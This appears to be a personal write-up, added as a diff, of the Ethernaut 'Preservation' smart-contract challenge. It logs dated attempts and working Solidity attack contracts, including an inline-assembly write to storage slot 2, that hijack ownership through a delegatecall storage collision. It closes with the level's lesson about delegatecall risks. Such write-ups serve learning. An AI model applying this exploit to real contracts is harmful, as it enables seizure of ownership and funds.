@@ -1,0 +1,124 @@
+Preservation
+Difficulty 8/10
+
+This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
+
+The goal of this level is for you to claim ownership of the instance you are given.
+
+  Things that might help
+
+Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
+Understanding what it means for delegatecall to be context-preserving.
+Understanding how storage variables are stored and accessed.
+Understanding how casting works between different data types.
+
+
+20220412 20:38 KST
+Pretty easy one.
+
+Step 1) Deploy a contract that shares same storage structure as the contract that needs to be exploited.
+Step 2) Call the first library to change library address to the one that I deployed in the first Step to change the owner of the contract.
+
+
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract PWD {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  uint public owner; 
+  uint storedTime;
+
+  function setTime(uint _time) public {
+    owner = _time;
+  }
+}
+
+220412 21:21 KST
+okay, the previos one did not change the owner (slot2).
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract PWD {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+
+  function setTime(uint _time) public {
+    address newOwner = address(uint160(_time));
+    owner = newOwner;
+  }
+}
+
+220412 22:09 KST
+what is weird is, when I do the debugging, valeu of key 0x2 is changed to my wallet
+HOWEVER, key is not supposed to be 0x2, it is supposed to be 0x0..........00002.
+maybe I should just use inline assembly to shove the value what I want in the slot #2?
+
+
+220413 16:29
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+// contract PWD {
+
+//   // public library contracts 
+//   address public timeZone1Library;
+//   address public timeZone2Library;
+//   address public owner; 
+//   uint storedTime;
+
+//   function setTime(uint _time) public {
+//     address newOwner = address(uint160(_time));
+//     owner = newOwner;
+//   }
+// }
+contract PWD {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  uint public owner; 
+  uint storedTime;
+
+  function setTime(uint _time) public {
+    // owner = _time;
+    assembly {
+        sstore(0x0000000000000000000000000000000000000000000000000000000000000002, _time)
+    }
+  }
+}
+
+when I did all this in Javascript VM, it worked.
+How it don't work in rinkeby...?
+
+okay. now I will try to use web3.js in the console.
+it seems to take in parameters in string.
+"0xEe45d004cc75ab025624276993eD07514Ce1b643"
+like this.
+
+220413 16:41 KST
+I think it has bug. it don't work in rinkeby. better take a look at github issues.
+
+okay. I will try to increase gas fee
+still don't work in rinkeby
+
+oh, my bad. it worked.
+
+
+Preservation
+Level completed!
+Difficulty 8/10
+
+As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
